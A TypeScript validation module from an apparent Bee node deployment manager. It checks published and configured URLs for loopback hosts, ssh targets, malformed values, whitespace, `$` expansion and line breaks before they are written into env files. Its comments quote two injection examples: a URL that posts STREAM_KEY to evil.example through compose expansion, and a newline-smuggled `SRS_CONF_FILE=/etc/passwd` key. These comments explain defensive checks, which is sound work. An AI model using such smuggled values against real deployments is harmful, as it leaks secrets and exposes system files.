/**
 * Whether the address a ladder hands out can actually be reached.
 *
 * `BEE_PUBLISHERS` carries one URL per rung, and that URL is the *only* thing an
 * off-host stream-uploader has to go on. It is built arithmetically, the address
 * a container on this host reaches the node on (`BEE_LOCAL_HOST`, or the Docker
 * bridge address the manager resolves when that is unset) plus `10005 + slot*10`,
 * so it always *looks* like a URL, and until something checks it, "the ladder is
 * ready" means no more than "we were able to compose a string".
 *
 * Two of the ways it goes wrong are provable without touching the network, which
 * matters because they are silent otherwise:
 *
 *  - **A loopback host.** The host in a pool string is the address
 *    `BEE_LOCAL_HOST` names, or the Docker bridge address the manager resolves
 *    when that is unset, so a loopback one comes from `BEE_LOCAL_HOST=127.0.0.1`
 *    or from a manager running natively. The value assembles fine and cannot
 *    work anywhere but this machine.
 *  - **An ssh target used as a network address.** `profiles.host` holds a *deploy*
 *    target, the schema documents it as "localhost, an ssh alias, or user@host".
 *    A `user@host` target composes to `http://deploy@1.2.3.4:10055`, which is not
 *    a bee base URL, and whose stray `@` sits inside a format that already uses
 *    `@` to separate the rung from the URL.
 *
 * The third way, the address is well-formed but nothing is listening, needs a
 * probe, and is reported separately, because a manager that cannot reach a public
 * address is weaker evidence than a malformed one: NAT hairpinning alone explains
 * it.
 */

import { envValueProblem } from './settingValues.js';

export type PublishUrlState =
  /** Structurally sound, and a bee node answered there. */
  | 'ok'
  /** Not checked: nothing probed it, or the probe could not run. */
  | 'unknown'
  /** Structurally sound, but nothing answered. Could also be hairpinning. */
  | 'unreachable'
  /** Points at this machine, so it means nothing to an uploader elsewhere. */
  | 'loopback'
  /** Carries ssh user info: a deploy target, not a network address. */
  | 'ssh-target'
  /** Not a URL at all. */
  | 'malformed';

export interface PublishUrlHealth {
  state: PublishUrlState;
  /** A bee node was found at this exact address. */
  ok: boolean;
  /** Provably unusable, no probe needed, and no probe would change it. */
  invalid: boolean;
}

const LOOPBACK_HOSTS = new Set([
  'localhost',
  '127.0.0.1',
  '::1',
  '[::1]',
  '0.0.0.0',
  '',
]);

const INVALID_STATES: readonly PublishUrlState[] = [
  'loopback',
  'ssh-target',
  'malformed',
];

export function isInvalidUrlState(
  state: PublishUrlState | null | undefined,
): boolean {
  return state != null && INVALID_STATES.includes(state);
}

/**
 * The structural verdict on a published rung URL: `'ok'` here means only "worth
 * probing", never "reachable".
 */
export function classifyPublishUrl(
  url: string | null | undefined,
): PublishUrlState {
  if (!url || !url.trim()) return 'malformed';

  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return 'malformed';
  }

  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return 'malformed';
  }
  // Either half of an ssh target. `user@` is the one that also corrupts the
  // BEE_PUBLISHERS entry format, since that separates rung from URL on `@`.
  if (parsed.username || parsed.password) return 'ssh-target';
  if (LOOPBACK_HOSTS.has(parsed.hostname.toLowerCase())) return 'loopback';

  return 'ok';
}

export function publishUrlHealth(state: PublishUrlState): PublishUrlHealth {
  return {
    state,
    ok: state === 'ok',
    invalid: isInvalidUrlState(state),
  };
}

/**
 * Why a URL in this state cannot be published, phrased for an operator reading a
 * list of rungs. `null` for the states that do not block.
 */
export function publishUrlReason(state: PublishUrlState): string | null {
  switch (state) {
    case 'loopback':
      return 'this rung’s address points at the manager’s own machine, so an uploader container reaches nothing there. The host in a pool string is what BEE_LOCAL_HOST names, or the Docker bridge address the manager resolves when it is unset, so set BEE_LOCAL_HOST to an address a container can reach';
    case 'ssh-target':
      return 'this rung’s address carries ssh user info, so it is a deploy target rather than a network address — set the profile’s host to the node’s own hostname or IP';
    case 'malformed':
      return 'this rung has no usable address';
    case 'ok':
    case 'unknown':
    case 'unreachable':
      return null;
  }
}

/**
 * A space reaches here only inside a path or a query, because the URL
 * constructor refuses one in a host or a port. There it percent-encodes the
 * space while the stored string keeps it literally, so the address that was
 * checked and the address written into `.env.<profile>` are two different
 * strings.
 */
const WHITESPACE_RE = /\s/;

const ADDRESS_WHITESPACE_MESSAGE =
  'this address must not contain a space, because the address that was checked and the address written into the env file would then not be the same one';

/**
 * A `$` anywhere is refused, rather than only a name docker compose would find.
 *
 * The file this address is written into is a full copy of the base env, which
 * carries STREAM_KEY, API_AUTH_TOKEN and PUBLISH_KEY_SECRET, and compose
 * expands `$NAME` and `${NAME}` in a value from the keys it parsed earlier in
 * that same file. So `https://evil.example/${STREAM_KEY}` is an address a node
 * then posts the deployment's signing key to. Which names resolve depends on
 * what the base env happens to hold, which is why the character is refused and
 * not a list of names.
 */
const EXPANSION_RE = /\$/;

const ADDRESS_EXPANSION_MESSAGE =
  'this address must not contain a $, because docker compose expands $NAME and ${NAME} inside a value in the env file this is written to, and what it would expand there are the deployment’s own secrets';

/**
 * Why this address cannot be written where an address goes, or null.
 *
 * Asked of every address the URL parse let through, because the parse cannot
 * see this: the WHATWG URL
 * constructor strips every tab, carriage return and line feed out of its input
 * and parses what is left, so `http://10.0.0.7:1633/x\nSRS_CONF_FILE=/etc/passwd`
 * comes back a sound URL while the stored string keeps the break. The stored
 * string is what becomes a `KEY=value` line in `.env.<profile>`, which docker
 * compose reads as an env file and the stack's deploy script reads as its
 * defaults, so the break is a second key of the address writer's choosing, and
 * `SRS_CONF_FILE` is the one that pays: the compose override bind-mounts
 * whatever it names into the engine container.
 *
 * `envValueProblem` already owns the line break and control character rules
 * every value of an env file answers to, and states them in its own words. The
 * space is this rule's own, for the reason `WHITESPACE_RE` gives above.
 */
function addressShapeProblem(value: string): string | null {
  return (
    envValueProblem(value) ??
    (WHITESPACE_RE.test(value) ? ADDRESS_WHITESPACE_MESSAGE : null) ??
    (EXPANSION_RE.test(value) ? ADDRESS_EXPANSION_MESSAGE : null)
  );
}

/**
 * Why an explicitly configured `BEE_URL` cannot be used, or null.
 *
 * Laxer than a ladder rung's address on purpose: this is the operator naming a
 * node deliberately, and `localhost` is right whenever the uploader runs on the
 * host network or natively. Only what cannot be meant is refused: a string that
 * is not an http(s) URL, an ssh target pasted where a network address goes, and
 * a value that would not survive the env file it is written into.
 */
export function beeUrlProblem(
  value: string | null | undefined,
): string | null {
  if (!value || !value.trim()) return null;
  const address = value.trim();
  switch (classifyPublishUrl(address)) {
    case 'malformed':
      return 'expected an http(s) URL, like http://10.0.0.7:1633';
    case 'ssh-target':
      return 'this address carries ssh user info, so it is a deploy target rather than a bee API URL';
    default:
      // A value the URL parser accepted is not yet a value the env file
      // survives, and this is the only way out of here that says yes.
      return addressShapeProblem(address);
  }
}

/**
 * Why this is not an address a Bee node could reach the chain through, or null.
 *
 * Empty is not a problem and never becomes one: a deployment that names none
 * takes the endpoint its stack version carries, which is how every deployment
 * worked before this was settable per node.
 */
export function rpcEndpointProblem(
  value: string | null | undefined,
): string | null {
  if (!value || !value.trim()) return null;
  const address = value.trim();
  switch (classifyPublishUrl(address)) {
    case 'malformed':
      return 'expected an http(s) URL, like https://rpc.example.org, or http://host.docker.internal:<port> for a proxy on the host';
    case 'ssh-target':
      return 'this address carries ssh user info, so it is a deploy target rather than a chain endpoint';
    default:
      return addressShapeProblem(address);
  }
}

/** Why a URL is worth a second look although it does not block. */
export function publishUrlWarning(state: PublishUrlState): string | null {
  return state === 'unreachable'
    ? 'nothing answered at this rung’s address. That address is what BEE_LOCAL_HOST names, or the Docker bridge address the manager resolved, so either the node is not listening on it or nothing routes to it from where the manager probed'
    : null;
}
